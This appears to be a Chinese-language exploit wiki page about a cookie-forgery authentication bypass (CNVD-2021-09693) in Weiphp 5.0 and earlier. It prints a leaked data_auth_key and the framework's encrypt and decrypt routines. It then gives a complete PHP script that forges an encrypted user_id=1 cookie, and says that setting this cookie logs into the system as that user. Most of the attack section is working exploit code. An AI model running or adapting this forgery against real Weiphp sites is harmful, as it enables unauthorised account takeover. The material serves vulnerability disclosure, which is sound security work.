<languages  />

漏洞影響
--------

    Weiphp <= 5.0

漏洞利用
--------

首先需要得到數據庫配置文件中的`data_auth_key`密鑰

![](Weiphp-15.png "Weiphp-15.png")

得到這個配置文件可參考 [CNVD-2020-68596 Weiphp5.0 前台文件任意讀取漏洞](https://www.pwnwiki.org/index.php?title=CNVD-2020-68596_Weiphp5.0_%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AE%80%E5%8F%96%E6%BC%8F%E6%B4%9E)

    'data_auth_key' => '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T'

全局查找使用了這個密鑰的地方:

![](Weiphp-16.png "Weiphp-16.png")

<div lang="chinese" dir="ltr" class="mw-content-ltr">
找到了跟據這個密鑰的加密方法和解密方法

</div>
<div lang="chinese" dir="ltr" class="mw-content-ltr">
加密方法 `think_encrypt`

</div>

    function think_encrypt($data, $key = '', $expire = 0)
    {
        $key = md5(empty($key) ? config('database.data_auth_key') : $key);

        $data = base64_encode($data);
        $x = 0;
        $len = strlen($data);
        $l = strlen($key);
        $char = '';

        for ($i = 0; $i < $len; $i++) {
            if ($x == $l) {
                $x = 0;
            }

            $char .= substr($key, $x, 1);
            $x++;
        }

        $str = sprintf('%010d', $expire ? $expire + time() : 0);

        for ($i = 0; $i < $len; $i++) {
            $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
        }
        return str_replace(array(
            '+',
            '/',
            '='
        ), array(
            '-',
            '_',
            ''
        ), base64_encode($str));
    }

<div lang="chinese" dir="ltr" class="mw-content-ltr">
解密方法 `think_decrypt`

</div>
    function think_decrypt($data, $key = '')
    {
        $key = md5(empty($key) ? config('database.data_auth_key') : $key);
        $data = str_replace(array(
            '-',
            '_'
        ), array(
            '+',
            '/'
        ), $data);
        $mod4 = strlen($data) % 4;
        if ($mod4) {
            $data .= substr('====', $mod4);
        }
        $data = base64_decode($data);
        $expire = substr($data, 0, 10);
        $data = substr($data, 10);

        if ($expire > 0 && $expire < time()) {
            return '';
        }
        $x = 0;
        $len = strlen($data);
        $l = strlen($key);
        $char = $str = '';

        for ($i = 0; $i < $len; $i++) {
            if ($x == $l) {
                $x = 0;
            }

            $char .= substr($key, $x, 1);
            $x++;
        }

        for ($i = 0; $i < $len; $i++) {
            if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1))) {
                $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
            } else {
                $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
            }
        }
        return base64_decode($str);
    }

<div lang="chinese" dir="ltr" class="mw-content-ltr">
在文件 `application\common.php` 中含有使用解密方法的代碼，用於做身份驗證

</div>
    function is_login()
    {
        $user = session('user_auth');
        if (empty($user)) {
            $cookie_uid = cookie('user_id');
            if (!empty($cookie_uid)) {
                $uid = think_decrypt($cookie_uid);
                $userinfo = getUserInfo($uid);
                D('common/User')->autoLogin($userinfo);

                $user = session('user_auth');
            }
        }
        if (empty($user)) {
            return 0;
        } else {
            return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0;
        }
    }

<div lang="chinese" dir="ltr" class="mw-content-ltr">
根據這裡得到的代碼，可以知道當user_Id=1時,會解密密鑰後判斷是否正確，如果正確則可以登錄系統

</div>
<div lang="chinese" dir="ltr" class="mw-content-ltr">
我們在本地使用加密代碼加密user_id=1得到的cookie則可以登錄系統

</div>
    <?php
    show_source(__FILE__);
    function think_encrypt($data, $key = '', $expire = 0)
    {
        $key = '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T';
        $key = md5($key);

        $data = base64_encode($data);
        $x = 0;
        $len = strlen($data);
        $l = strlen($key);
        $char = '';

        for ($i = 0; $i < $len; $i++) {
            if ($x == $l) {
                $x = 0;
            }

            $char .= substr($key, $x, 1);
            $x++;
        }

        $str = sprintf('%010d', $expire ? $expire + time() : 0);

        for ($i = 0; $i < $len; $i++) {
            $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
        }
        return str_replace(array(
            '+',
            '/',
            '='
        ), array(
            '-',
            '_',
            ''
        ), base64_encode($str));
    }

    echo 'user_id = ' . think_encrypt($_GET['user_id']);
    ?>

<div lang="chinese" dir="ltr" class="mw-content-ltr">
添加`cookie: user_id=xxxxxxxx`即可成功登錄

</div>
![](Weiphp-18.png "Weiphp-18.png")

<div lang="chinese" dir="ltr" class="mw-content-ltr">
參考
----

</div>
<http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693.html>